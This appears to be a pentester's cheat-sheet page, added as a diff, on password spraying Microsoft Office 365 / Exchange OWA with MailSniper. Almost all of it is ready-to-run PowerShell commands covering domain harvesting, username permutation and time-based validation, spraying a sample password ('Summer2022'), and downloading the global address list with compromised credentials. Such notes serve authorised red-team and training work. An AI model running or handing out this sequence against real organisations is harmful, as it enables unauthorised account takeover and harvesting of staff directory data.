@@ -1,0 +1,41 @@
+---
+layout:     post
+author:     0x5c4r3
+type: docs
+permalink: Office_365
+---
+
+
+<span style="font-size: 35px; color:red"><b>Microsoft Office 365</b></span>
+<span style="font-size: 25px;"><b>Password Spray</b></span>
+- [MailSniper](https://github.com/dafthack/MailSniper)
+- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px;"><b>MailSniper.ps1</b></span>
+&nbsp;
+```powershell
+import-module ./MailSniper.ps1
+```
+Enumerate the NETBios Domain Name:
+```powershell
+Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+```
+Starting from a list of "Name Surname" (names.txt), create a list of permutations with [namemash.py](https://gist.github.com/superkojiman/11076951):
+```powershell
+namemash.py <names.txt> > <possible.txt>
+```
+Validate usernames through a time-based enumeration:
+```powershell
+Invoke-UsernameHarvestOWA -ExchHostname <hostname_OWA_without_https://> -Domain <domain> -UserList <possible.txt> -OutFile <valid.txt>
+```
+Password Spray OWA:
+```powershell
+Invoke-PasswordSprayOWA -ExchHostname <hostname_OWA_without_https://> -UserList <valid.txt> -Password Summer2022
+```
+Download global address list using working credentials found before:
+```powershell
+Get-GlobalAddressList -ExchHostname <hostname_OWA_without_https://> -UserName <domain\username> -Password Summer2022 -OutFile <list.txt>
+```
